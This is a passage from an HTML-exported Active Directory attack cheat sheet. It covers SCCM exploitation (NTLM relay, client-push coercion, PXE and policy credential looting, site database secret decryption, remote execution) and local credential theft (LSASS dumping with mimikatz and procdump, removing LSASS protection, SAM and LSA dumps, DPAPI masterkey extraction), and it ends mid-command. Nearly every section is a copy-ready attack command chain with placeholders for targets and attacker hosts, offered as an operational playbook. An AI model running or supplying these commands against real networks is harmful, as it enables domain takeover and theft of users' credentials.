name="Domain_Dominance--ADCS--Abuse_Certificate_Mapping--ESC14_(explicit)_1216.html"></a><h1 class='title level-4'>ESC14 (explicit)</h1><br/><p># ADCS</p><p>## Abuse Certificate Mapping</p><p></p><p>ESC14 (explicit)</p></div><div class='page'><a name="Domain_Dominance--SCCM_977.html"></a><h1 class='title level-2'>SCCM</h1><br/><p><ul><li>Recon (<code>sccmhunter find</code>, <code>ldeep</code>, <code>nxc smb</code>)</li></ul></p><p> • <strong>Intent:</strong> Identify SCCM infra and shares.</p><p> • <strong>Purpose:</strong> Recon SCCM environment.</p><p><ul><li>Creds-1 PXE extract</li></ul></p><p> • <strong>Intent:</strong> Pull creds from PXE boot.</p><p> • <strong>Purpose:</strong> Gain NAA creds.</p><p><ul><li>Elevate-1 relay on site systems</li></ul></p><p> • <strong>Intent:</strong> Relay NTLM to site server.</p><p> • <strong>Purpose:</strong> Admin on site system.</p><p><ul><li>Elevate-2 force client push</li></ul></p><p> • <strong>Intent:</strong> Relay NTLM to SCCM server.</p><p> • <strong>Purpose:</strong> Escalate to admin.</p><p><ul><li>Elevate-3 auto client push</li></ul></p><p> • <strong>Intent:</strong> Abuse DNS+SPN for rogue host.</p><p> • <strong>Purpose:</strong> Force push to attacker system.</p><p><ul><li>Creds-6 loot creds (cmloot, SCCMSecrets)</li></ul></p><p> • <strong>Intent:</strong> Extract creds from SCCM SMB/HTTP.</p><p> • <strong>Purpose:</strong> Gather user creds.</p><p><ul><li>Takeover-1 MSSQL relay</li></ul></p><p> • <strong>Intent:</strong> Abuse SCCM DB trust with relay.</p><p> • <strong>Purpose:</strong> Escalate to SCCM Admin.</p><p><ul><li>Takeover-2 MSSQL relay</li></ul></p><p> • <strong>Intent:</strong> Relay to MSSQL.</p><p> • <strong>Purpose:</strong> Admin MSSQL.</p><p><ul><li>Creds-2 policy secrets</li></ul></p><p> • <strong>Intent:</strong> Abuse SCCM policy for creds.</p><p> • <strong>Purpose:</strong> Harvest user/pass.</p><p><ul><li>Creds-3/4 Computer admin loot</li></ul></p><p> • <strong>Intent:</strong> Extract secrets from SCCM target.</p><p> • <strong>Purpose:</strong> Pivot to NAA creds.</p><p><ul><li>Creds-5 SCCM admin → site DB</li></ul></p><p> • <strong>Intent:</strong> Dump DB secrets via secretsdump.</p><p> • <strong>Purpose:</strong> Escalate to site DB.</p><p><ul><li>Exec-1/2 SCCM admin exec</li></ul></p><p> • <strong>Intent:</strong> Remote exec via SCCM.</p><p> • <strong>Purpose:</strong> Lateral move.</p><p><ul><li>Post exploit (<code>SCCMHound</code>)</li></ul></p><p> • <strong>Intent:</strong> Enumerate sessions.</p><p> • <strong>Purpose:</strong> Post-exploitation recon.</p><p></p></div><div class='page'><a name="Domain_Dominance--SCCM--Recon_1067.html"></a><h1 class='title level-3'>Recon</h1><br/><p># SCCM</p><p>## Recon</p><p></p><p>sccmhunter.py find -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -dc-ip &lt;dc_ip&gt; -debug</p><p>&gt;&gt;	sccmhunter.py show -all</p><p></p><p>ldeep ldap -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -s ldap://&lt;dc_ip&gt; sccm</p><p></p><p>nxc smb &lt;sccm_server&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; --shares</p></div><div class='page'><a name="Domain_Dominance--SCCM--Creds-1_No_credentials_1068.html"></a><h1 class='title level-3'>Creds-1 No credentials</h1><br/><p># SCCM</p><p>## Creds-1 No credentials &gt;&gt;&gt; PXE [<a href="#Domain_Dominance--No_Credentials--PXE_992.html">PXE</a>] &gt;&gt;&gt; NAA credentials || User + Pass [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]</p><p></p><p>Extract from pxe. See no creds &gt;&gt;&gt; PXE [<a href="#Domain_Dominance--No_Credentials--PXE_992.html">PXE</a>]</p></div><div class='page'><a name="Domain_Dominance--SCCM--Elevate-1Relay_on_site_systems_Simple_user_1069.html"></a><h1 class='title level-3'>Elevate-1:Relay on site systems Simple user</h1><br/><p># SCCM</p><p>##  Elevate-1:Relay on site systems Simple user &gt;&gt;&gt; Admin on Site system [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>coerce sccm site server</p><p>&gt;&gt;	ntlmrelayx.py -tf &lt;site_systems&gt; -smb2support</p></div><div class='page'><a name="Domain_Dominance--SCCM--Elevate-2Force_client_push_Simple_user_1070.html"></a><h1 class='title level-3'>Elevate-2:Force client push Simple user</h1><br/><p># SCCM</p><p>## Elevate-2:Force client push Simple user &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>ntlmrelayx.py -t &lt;sccm_server&gt; -smb2support -socks # listen connection</p><p>&gt;&gt;	SharpSCCM.exe invoke client-push -mp &lt;sccm_server&gt;.&lt;domain&gt; -sc &lt;site_code&gt; -t &lt;attacker_ip&gt; # Launch client push install</p><p>	&gt;&gt;	proxychains smbexec.py -no-pass &lt;domain&gt;/&lt;socks_user&gt;@&lt;sccm_server&gt;</p><p>		&gt;&gt;&gt;	cleanup [<a href="#Domain_Dominance--SCCM--Cleanup_1079.html">Cleanup</a>]</p></div><div class='page'><a name="Domain_Dominance--SCCM--Elevate-3Automatic_client_push_Simple_user_1071.html"></a><h1 class='title level-3'>Elevate-3:Automatic client push Simple user</h1><br/><p># SCCM</p><p>## Elevate-3:Automatic client push Simple user &gt;&gt;&gt; Relay ntlm [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)--NTLM_relay_1008.html">NTLM relay</a>]</p><p></p><p>Create DNS A record for non existing computer x</p><p>&gt;&gt;	dnstool.py -u &#39;&lt;domain&gt;\&lt;user&gt;&#39; -p &lt;pass&gt;  -r &lt;newcomputer&gt;.&lt;domain&gt; -a add -t A -d &lt;attacker_ip&gt; &lt;dc_ip&gt;</p><p>	&gt;&gt;	Enroll new computer x in AD  then remove host SPN from the machine account</p><p>		&gt;&gt;	setspn -D host/&lt;newcomputer&gt; &lt;newcomputer&gt; setspn -D host/&lt;newcomputer&gt;.&lt;domain&gt; &lt;newcomputer&gt;</p><p>			&gt;&gt;	wait 5m for client push</p><p>				&gt;&gt;	ntlmrelayx.py -tf &lt;no_signing_target&gt; -smb2support -socks</p><p>					&gt;&gt;&gt;	cleanup [<a href="#Domain_Dominance--SCCM--Cleanup_1079.html">Cleanup</a>]</p></div><div class='page'><a name="Domain_Dominance--SCCM--CRED-6_Loot_creds_1072.html"></a><h1 class='title level-3'>CRED-6 Loot creds</h1><br/><p># SCCM</p><p></p><p>## CRED-6 Loot creds &gt;&gt;&gt; User + Pass [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]<ul><li>SCCM SMB service (445/TCP) on a DP</li></ul></p><p>  - `cmloot.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;sccm_dp&gt; -cmlootinventory sccmfiles.txt`<ul><li>SCCM HTTP service (80/TCP or 443/TCP) on a DP</li></ul></p><p>  - `SCCMSecrets.py policies -mp <a href="http://">http://</a>&lt;management_point&gt; -u &#39;&lt;machine_account&gt;$&#39; -p &#39;&lt;machine_password&gt;&#39; -cn &#39;&lt;client_name&gt;&#39;`</p><p>  - `SCCMSecrets.py files -dp <a href="http://">http://</a>&lt;distribution_point&gt; -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39;`</p><p>  - `sccm-http-looter -server &lt;ip_dp&gt;`</p></div><div class='page'><a name="Domain_Dominance--SCCM--CRED-6_Loot_creds--SCCM_SMB_service_(445-TCP)_on_a_DP_1222.html"></a><h1 class='title level-4'>SCCM SMB service (445/TCP) on a DP</h1><br/><p># SCCM</p><p>## CRED-6 Loot creds &gt;&gt;&gt; User + Pass [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]</p><p>### SCCM SMB service (445/TCP) on a DP</p><p></p><p>cmloot.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;sccm_dp&gt; -cmlootinventory sccmfiles.txt</p></div><div class='page'><a name="Domain_Dominance--SCCM--CRED-6_Loot_creds--SCCM_HTTP_service_(80-TCP_or_443-TCP)_on_a_DP_1223.html"></a><h1 class='title level-4'>SCCM HTTP service (80/TCP or 443/TCP) on a DP</h1><br/><p># SCCM</p><p>## CRED-6 Loot creds &gt;&gt;&gt; User + Pass [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]</p><p>### SCCM HTTP service (80/TCP or 443/TCP) on a DP</p><p></p><p>SCCMSecrets.py policies -mp <a href="http://">http://</a>&lt;management_point&gt; -u &#39;&lt;machine_account&gt;$&#39; -p &#39;&lt;machine_password&gt;&#39; -cn &#39;&lt;client_name&gt;&#39;</p><p></p><p>SCCMSecrets.py files -dp <a href="http://">http://</a>&lt;distribution_point&gt; -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39;</p><p></p><p>sccm-http-looter -server &lt;ip_dp&gt;</p></div><div class='page'><a name="Domain_Dominance--SCCM--Takeover-1relay_to_mssql_db_Simple_user_1073.html"></a><h1 class='title level-3'>Takeover-1:relay to mssql db Simple user</h1><br/><p># SCCM</p><p>## Takeover-1:relay to mssql db Simple user &gt;&gt;&gt; SCCM ADMIN [<a href="#Domain_Dominance--SCCM--Creds-5_SCCM_admin_1077.html">Creds-5 SCCM admin</a>] [<a href="#Domain_Dominance--SCCM--EXEC-1-2_SCCM_admin_1078.html">EXEC-1/2 SCCM admin</a>]</p><p>### SCCM MSSQL != SSCM server</p><p></p><p>sccmhunter.py mssql -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -dc-ip &lt;dc_ip&gt; -debug -tu &lt;target_user&gt; -sc &lt;site_code&gt; -stacked</p><p>&gt;&gt;	ntlmrelayx.py -smb2support -ts -t mssql://&lt;sccm_mssql&gt; -q &quot;&lt;query&gt;&quot;</p><p>	&gt;&gt;	coerce sccm_mssql -&gt; attacker</p><p>		&gt;&gt;	sccmhunter.py admin -u &lt;target_user&gt;@&lt;domain&gt; -p &#39;&lt;password&gt;&#39; -ip &lt;sccm_ip&gt;</p></div><div class='page'><a name="Domain_Dominance--SCCM--Takeover-2relay_to_mssql_server_Simple_user_1074.html"></a><h1 class='title level-3'>Takeover-2:relay to mssql server Simple user</h1><br/><p># SCCM</p><p>## Takeover-2:relay to mssql server Simple user &gt;&gt;&gt; Admin MSSQL [<a href="#Domain_Dominance--Lateral_Movement--MSSQL_1092.html">MSSQL</a>]</p><p>### SCCM MSSQL != SSCM server</p><p></p><p>ntlmrelayx.py -t &lt;sccm_mssql&gt; -smb2support -socks</p><p>&gt;&gt;	coerce sccm_server </p><p>	&gt;&gt;	proxychains smbexec.py -no-pass &lt;domain&gt;/&#39;&lt;sccm_server&gt;$&#39;@&lt;sccm_ip&gt;</p></div><div class='page'><a name="Domain_Dominance--SCCM--Creds-2Policy_Request_Credentials_Simple_user_1075.html"></a><h1 class='title level-3'>Creds-2:Policy Request Credentials Simple user</h1><br/><p># SCCM</p><p></p><p>## Creds-2:Policy Request Credentials Simple user &gt;&gt;&gt; User + Pass [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]<ul><li>add computer</li></ul></p><p>  - `sccmwtf.py newcomputer newcomputer.&lt;domain&gt; &lt;target&gt; &#39;&lt;domain&gt;\&lt;computer_added&gt;$&#39; &#39;&lt;computer_pass&gt;&#39;`</p><p>    - get NetworkAccessUsername and NetworkAccessPassword<ul><li>`policysecretunobfuscate.py`</li></ul></p><p>        - delete device created after sccmadmin</p><p>  - `SharpSCCM.exe get secrets -r newcomputer -u &lt;computer_added&gt;$ -p &lt;computer_pass&gt;&quot;`</p><p>    - cleanup [<a href="#Domain_Dominance--SCCM--Cleanup_1079.html">Cleanup</a>]</p></div><div class='page'><a name="Domain_Dominance--SCCM--Creds-2Policy_Request_Credentials_Simple_user--Add_Computer_1224.html"></a><h1 class='title level-4'>Add Computer</h1><br/><p># SCCM</p><p>## Creds-2:Policy Request Credentials Simple user &gt;&gt;&gt; User + Pass [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]</p><p>### Add computer</p><p></p><p>sccmwtf.py newcomputer newcomputer.&lt;domain&gt; &lt;target&gt; &#39;&lt;domain&gt;\&lt;computer_added&gt;$&#39; &#39;&lt;computer_pass&gt;&#39;</p><p>&gt;&gt;	get NetworkAccessUsername and NetworkAccessPassword</p><p>	&gt;&gt;	policysecretunobfuscate.py</p><p>		&gt;&gt;	delete device created after sccmadmin</p><p> </p><p>SharpSCCM.exe get secrets -r newcomputer -u &lt;computer_added&gt;$ -p &lt;computer_pass&gt;&quot;</p><p>&gt;&gt;&gt;	Cleanup [<a href="#Domain_Dominance--SCCM--Cleanup_1079.html">Cleanup</a>]</p></div><div class='page'><a name="Domain_Dominance--SCCM--Creds-3-Creds-4_Computer_Admin_user_1076.html"></a><h1 class='title level-3'>Creds-3/Creds-4 Computer Admin user</h1><br/><p># SCCM</p><p>## Creds-3Creds-4 Computer Admin user &gt;&gt;&gt; NAA credentials [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]</p><p></p><p>dploot.py sccm -u &lt;admin&gt; -p &#39;&lt;password&gt;&#39; &lt;sccm_target&gt;</p><p></p><p>sccmhunter.py dpapi  -u &lt;admin&gt; -p &#39;&lt;password&gt;&#39; -target &lt;sccm_target&gt; -debug</p><p></p><p>SharpSCCM.exe local secrets -m disk</p><p></p><p>SharpSCCM.exe local secrets -m wmi</p></div><div class='page'><a name="Domain_Dominance--SCCM--Creds-5_SCCM_admin_1077.html"></a><h1 class='title level-3'>Creds-5 SCCM admin</h1><br/><p># SCCM</p><p>## Creds-5 SCCM admin &gt;&gt;&gt; Site DB credentials [<a href="#Domain_Dominance--Lateral_Movement--Clear_text_Password_1087.html">Clear text Password</a>]</p><p></p><p>secretsdump.py &lt;domain&gt;/&lt;admin&gt;:&#39;&lt;pass&gt;&#39;@&lt;sccm_target&gt;</p><p>&gt;&gt;	mssqlclient.py -windows-auth -hashes &#39;&lt;sccm_target_hashNT&gt;&#39; &#39;&lt;domain&gt;/&lt;sccm_target&gt;$&#39;@&lt;sccm_mssql&gt;</p><p>	&gt;&gt;	use CM_&lt;site_code&gt;;</p><p>		&gt;&gt;	SELECT * FROM SC_UserAccount;</p><p>			&gt;&gt;	sccmdecryptpoc.exe &lt;cyphered_value&gt;</p><p>	&gt;&gt;	get_device &lt;hostname&gt;</p><p>		&gt;&gt;	interact &lt;device_id&gt;</p><p>			&gt;&gt;	script xploit.ps1</p></div><div class='page'><a name="Domain_Dominance--SCCM--EXEC-1-2_SCCM_admin_1078.html"></a><h1 class='title level-3'>EXEC-1/2 SCCM admin</h1><br/><p># SCCM</p><p>## EXEC-1/2 SCCM admin &gt;&gt;&gt; lat [<a href="#Domain_Dominance--Lateral_Movement_979.html">Lateral Movement</a>]</p><p></p><p>SharpSCCM.exe exec -p &lt;binary&gt; -d &lt;device_name&gt; -sms &lt;SMS_PROVIDER&gt; -sc &lt;SITECODE&gt; --no-banner</p><p></p><p>sccmhunter.py admin -u &lt;user&gt;@&lt;domain&gt; -p &#39;&lt;password&gt;&#39; -ip &lt;sccm_ip&gt;</p><p></p></div><div class='page'><a name="Domain_Dominance--SCCM--Cleanup_1079.html"></a><h1 class='title level-3'>Cleanup</h1><br/><p># SCCM</p><p>## Cleanup</p><p></p><p>SharpSCCM.exe get devices -sms &lt;SMS_PROVIDER&gt; -sc &lt;SITECODE&gt; -n &lt;NTLMRELAYX_LISTENER_IP&gt; -p &quot;Name&quot; -p &quot;ResourceId&quot; -p &quot;SMSUniqueIdentifier&quot;</p><p>&gt;&gt;	SharpSCCM.exe remove device GUID:&lt;GUID&gt; -sms &lt;SMS_PROVIDER&gt; -sc &lt;SITECODE&gt;</p></div><div class='page'><a name="Domain_Dominance--SCCM--Post_exploit_1080.html"></a><h1 class='title level-3'>Post exploit</h1><br/><p># SCCM</p><p>## Post exploit</p><p></p><p>As sccm admin</p><p>&gt;&gt;	SCCMHound.exe --server &lt;server&gt; --sitecode &lt;sitecode&gt; &gt;&gt;&gt; Users sessions [<a href="#Domain_Dominance--Lateral_Movement_979.html">Lateral Movement</a>]</p></div><div class='page'><a name="Domain_Dominance--Admin_Access_978.html"></a><h1 class='title level-2'>Admin Access</h1><br/><p><ul><li>LSASS dump (<code>procdump</code>, <code>mimikatz sekurlsa</code>, <code>lsassy</code>)</li></ul></p><p> • <strong>Intent:</strong> Extract live creds and hashes from LSASS.</p><p> • <strong>Purpose:</strong> Obtain cleartext passwords, NTLM, or tickets.</p><p><ul><li>SAM dump (<code>nxc smb --sam</code>, <code>secretsdump.py</code>)</li></ul></p><p> • <strong>Intent:</strong> Dump local SAM database.</p><p> • <strong>Purpose:</strong> Collect local hashes for lateral reuse.</p><p><ul><li>LSA secrets (<code>lsadump::lsa</code>, <code>--lsa</code>)</li></ul></p><p> • <strong>Intent:</strong> Extract cached domain creds.</p><p> • <strong>Purpose:</strong> Reuse offline or escalate.</p><p><ul><li>DPAPI dump (<code>donpapi</code>, <code>dpapidump</code>)</li></ul></p><p> • <strong>Intent:</strong> Extract and decrypt DPAPI secrets.</p><p> • <strong>Purpose:</strong> Gain browser creds, certs, or other secrets.</p><p><ul><li>Impersonation (<code>incognito</code>, <code>schtask_as</code>, <code>irs.exe</code>)</li></ul></p><p> • <strong>Intent:</strong> Steal or abuse tokens.</p><p> • <strong>Purpose:</strong> Pivot into other accounts / Admin.</p><p><ul><li>RDP impersonation (<code>psexec -s -i</code>, <code>tscon</code>)</li></ul></p><p> • <strong>Intent:</strong> Take over interactive RDP sessions.</p><p> • <strong>Purpose:</strong> Hijack sessions for lateral movement.</p><p><ul><li>KeePass extraction (<code>KeePwn.py</code>)</li></ul></p><p> • <strong>Intent:</strong> Loot KeePass databases.</p><p> • <strong>Purpose:</strong> Get creds for escalation.</p><p><ul><li>Azure AD-Connect MSOL dump</li></ul></p><p> • <strong>Intent:</strong> Extract MSOL sync account password.</p><p> • <strong>Purpose:</strong> Full control over cloud and hybrid identities.</p><p></p><p></p></div><div class='page'><a name="Domain_Dominance--Admin_Access--Extract_credentials_from_LSASS.exe_1081.html"></a><h1 class='title level-3'>Extract credentials from LSASS.exe</h1><br/><p># Admin access</p><p></p><p>## Extract credentials from LSASS.exe<ul><li>LSASS as protected process</li></ul></p><p>  - `PPLdump64.exe &lt;lsass.exe|lsass_pid&gt; lsass.dmp #before 2022-07-22 update`</p><p>  - `mimikatz &quot;!+&quot; &quot;!processprotect /process:lsass.exe /remove&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot;  &quot;sekurlsa::logonpasswords&quot; &quot;!processprotect  /process:lsass.exe&quot; &quot;!-&quot;`<ul><li>Extract LSASS secrets  &gt;&gt;&gt; User + Pass [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>] || NTLM [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>] || PassTheHash [<a href="#Domain_Dominance--Lateral_Movement--NT_Hash--Pass_the_Hash_1241.html">Pass the Hash</a>] || Clear text move [<a href="#Domain_Dominance--Lateral_Movement--Clear_text_Password_1087.html">Clear text Password</a>]</li></ul></p><p>  - `procdump.exe -accepteula -ma lsass.exe lsass.dmp`</p><p>  - `mimikatz &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot;  &quot;exit&quot;`</p><p>  - `msf&gt; load kiwi creds_all`</p><p>  - `nxc smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -M lsassy`</p><p>  - `lsassy -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; &lt;ip&gt;`</p></div><div class='page'><a name="Domain_Dominance--Admin_Access--Extract_credentials_from_LSASS.exe--LSASS_as_protected_process_1225.html"></a><h1 class='title level-4'>LSASS as protected process</h1><br/><p># Admin access</p><p>## Extract credentials from LSASS.exe</p><p>### LSASS as protected process</p><p></p><p>PPLdump64.exe &lt;lsass.exe|lsass_pid&gt; lsass.dmp #before 2022-07-22 update</p><p>&gt;&gt;	mimikatz &quot;!+&quot; &quot;!processprotect /process:lsass.exe /remove&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot;  &quot;sekurlsa::logonpasswords&quot; &quot;!processprotect  /process:lsass.exe&quot; &quot;!-&quot;</p></div><div class='page'><a name="Domain_Dominance--Admin_Access--Extract_credentials_from_LSASS.exe--Extract_LSASS_secrets_1226.html"></a><h1 class='title level-4'>Extract LSASS secrets</h1><br/><p># Admin access</p><p>## Extract credentials from LSASS.exe</p><p>### Extract LSASS secrets  &gt;&gt;&gt; User + Pass [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>] || NTLM [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>] || PassTheHash [<a href="#Domain_Dominance--Lateral_Movement--NT_Hash--Pass_the_Hash_1241.html">Pass the Hash</a>] || Clear text move [<a href="#Domain_Dominance--Lateral_Movement--Clear_text_Password_1087.html">Clear text Password</a>]</p><p> </p><p>procdump.exe -accepteula -ma lsass.exe lsass.dmp</p><p></p><p>mimikatz &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot;  &quot;exit&quot;</p><p></p><p>msf&gt; load kiwi creds_all</p><p></p><p>nxc smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -M lsassy</p><p></p><p>lsassy -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; &lt;ip&gt;</p></div><div class='page'><a name="Domain_Dominance--Admin_Access--Extract_credentials_from_SAM_1082.html"></a><h1 class='title level-3'>Extract credentials from SAM</h1><br/><p># Admin access</p><p>## Extract credentials from SAM &gt;&gt;&gt; NTLM [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>] || PassTheHash [<a href="#Domain_Dominance--Lateral_Movement--NT_Hash--Pass_the_Hash_1241.html">Pass the Hash</a>]</p><p></p><p>nxc smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; --sam</p><p></p><p>msf&gt; hashdump</p><p></p><p>mimikatz &quot;privilege::debug&quot; &quot;lsadump::sam&quot; &quot;exit&quot;</p><p></p><p>secretsdump.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</p><p></p><p>reg save HKLM\SAM &lt;file&gt;;  reg save HKLM\SYSTEM &lt;file&gt;</p><p>&gt;&gt;	secretsdump.py -system SYSTEM -sam SAM LOCAL</p><p></p><p>reg.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt; backup -o &#39;\\&lt;smb_ip&gt;\share&#39;</p><p>&gt;&gt;	secretsdump.py -system SYSTEM -sam SAM LOCAL</p><p></p><p>regsecrets.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</p></div><div class='page'><a name="Domain_Dominance--Admin_Access--Extract_credentials_from_LSA_1083.html"></a><h1 class='title level-3'>Extract credentials from LSA</h1><br/><p># Admin access</p><p>## Extract credentials from LSA &gt;&gt;&gt; MsCache 2 [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>] || User + Pass [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]</p><p></p><p>nxc smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; --lsa</p><p></p><p>mimikatz &quot;privilege::debug&quot; &quot;lsadump::lsa&quot; &quot;exit&quot;</p><p></p><p>reg save HKLM\SECURITY &lt;file&gt;;  reg save HKLM\SYSTEM &lt;file&gt;</p><p>&gt;&gt;	secretsdump.py -system SYSTEM -security SECURITY</p><p></p><p>reg.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt; backup -o &#39;\\&lt;smb_ip&gt;\share&#39;</p></div><div class='page'><a name="Domain_Dominance--Admin_Access--Extract_credentials_from_DPAPI_1084.html"></a><h1 class='title level-3'>Extract credentials from DPAPI</h1><br/><p># Admin access</p><p></p><p>## Extract credentials from DPAPI<ul><li>DPAPI &gt;&gt;&gt; User + Pass [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>] || PassTheHash [<a href="#Domain_Dominance--Lateral_Movement--NT_Hash--Pass_the_Hash_1241.html">Pass the Hash</a>] || Clear text move [<a href="#Domain_Dominance--Lateral_Movement--Clear_text_Password_1087.html">Clear text Password</a>]</li></ul></p><p>  - `nxc smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; --dpapi [cookies] [nosystem]`</p><p>  - `donpapi &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;target&gt;`</p><p>  - `dpapidump.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;target&gt;`</p><p>  - get masterkey</p><p>    - `mimikatz &quot;sekurlsa::dpapi&quot;`<ul><li>`dploot.py browser -d &lt;domain&gt; -u &lt;user&gt; -p &#39;&lt;password&gt;&#39; &lt;ip&gt; -mkfile &lt;masterkeys_file&gt;`</li></ul></p><p>    - `lsassy -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; &lt;ip&gt; -m rdrleakdiag -M masterkeys`<ul><li>`dploot.py browser -d &lt;domain&gt; -u &lt;user&gt; -p &#39;&lt;password&gt;&#39; &lt;ip&gt; -mkfile &lt;masterkeys_file&gt;`</li></ul></p><p>  - `SharpDPAPI.exe triage`</p><p><ul><li>Crack users masterkey &gt;&gt;&gt; DPAPImk [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>]</li></ul></p><p>  - copy c:\users\&lt;user&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt; </p><p>    - `DPAPImk2john.py --preferred &lt;prefered_file&gt;`<ul><li>`DPAPImk2john.py -c domain -mk &lt;masterkey&gt; -S &lt;sid&gt;`</li></ul></p></div><div class='page'><a name="Domain_Dominance--Admin_Access--Extract_credentials_from_DPAPI--DPAPI_1227.html"></a><h1 class='title level-4'>DPAPI</h1><br/><p># Admin access</p><p>## Extract credentials from DPAPI</p><p>### DPAPI &gt;&gt;&gt; User + Pass [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>] || PassTheHash [<a href="#Domain_Dominance--Lateral_Movement--NT_Hash--Pass_the_Hash_1241.html">Pass the Hash</a>] || Clear text move [<a href="#Domain_Dominance--Lateral_Movement--Clear_text_Password_1087.html">Clear text Password</a>]</p><p></p><p>nxc smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; --dpapi [cookies] [nosystem]</p><p></p><p>donpapi &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;target&gt;</p><p></p><p>dpapidump.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;target&gt;</p><p></p><p>SharpDPAPI.exe triage</p></div><div class='page'><a name="Domain_Dominance--Admin_Access--Extract_credentials_from_DPAPI--DPAPI--Get_masterkey_1229.html"></a><h1 class='title level-5'>Get masterkey</h1><br/><p># Admin access</p><p>## Extract credentials from DPAPI</p><p>### DPAPI &gt;&gt;&gt; User + Pass [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>] || PassTheHash [<a href="#Domain_Dominance--Lateral_Movement--NT_Hash--Pass_the_Hash_1241.html">Pass the Hash</a>] || Clear text move [<a href="#Domain_Dominance--Lateral_Movement--Clear_text_Password_1087.html">Clear text Password</a>]</p><p>#### Get masterkey</p><p></p><p>mimikatz &quot;sekurlsa::dpapi&quot;</p><p>&gt;&gt;	dploot.py browser -d &lt;domain&gt; -u &lt;user&gt; -p &#39;&lt;password&gt;&#39; &lt;ip&gt; -mkfile &lt;masterkeys_file&gt;</p><p></p><p>lsassy -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; &lt;ip&gt; -m rdrleakdiag -M masterkeys</p><p>&gt;&gt;	dploot.py browser -d &lt;domain&gt; -u &lt;user&gt; -p &#39;&lt;password&gt;&#39; &lt;ip&gt; -mkfile &lt;masterkeys_file&gt;</p></div><div class='page'><a name="Domain_Dominance--Admin_Access--Extract_credentials_from_DPAPI--Crack_users_masterkey_1228.html"></a><h1 class='title level-4'>Crack users masterkey</h1><br/><p># Admin access</p><p>## Extract credentials from DPAPI</p><p>### Crack users masterkey &gt;&gt;&gt; DPAPImk [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>]</p><p></p><p>copy 